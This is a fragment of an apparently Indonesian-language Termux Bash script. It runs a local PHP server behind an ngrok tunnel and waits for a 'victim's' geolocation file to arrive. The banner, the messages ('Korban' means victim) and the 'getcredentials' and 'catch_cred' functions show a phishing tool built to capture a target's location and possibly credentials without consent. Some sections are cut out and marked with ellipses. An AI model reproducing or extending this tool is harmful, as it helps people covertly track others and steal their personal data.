...
command -v php > /dev/null 2>&1 || { echo >&2 "pkg install php dulu gan."; exit 1; }



command -v curl > /dev/null 2>&1 || { echo >&2 "pkg install curl dulu gan."; exit 1; }
...
getcredentials() {
printf "\e[0;36m[\e[0m\e[1;77m*\e[0m\e[1;93m] Menunggu Lokasi ...\e[0m\n"
while [ true ]; do


if [[ -e "server/geolocate.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Lokasi ditemukan!\n"
catch_cred
...
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Korban memblock akses ...\e[0m\n"
...
printf "\e[0;35m[\e[0m*\e[1;35m] Downloading Ngrok...\n"
...
printf "\e[0;35m[\e[0m*\e[1;35m] Memulai php server...\n"
php -t "server/" -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[0;35m[\e[0m*\e[1;35m] Memulai server ngrok...\n"
...
printf "\e[0;36m  _|_|_|     _|          _|                                               \e[0m\n"
printf "\e[0;36m  _|    _|   _|          _|       \e[0m\e[1;77m_                 \e[0m\n"
printf "\e[0;36m  _|    _|   _|    _|    _|  \e[0m\n"
printf "\e[0;36m  _|    _|     _|  _|  _| \e[0m\n"
printf "\e[0;36m _|_|_|         _|  _|     \e[0m\n"
printf "\e[0;36m DWWWWWWWWWWWWWWWWWWWWWWWWD    v1.1 \e[0m\n"
printf "\n"
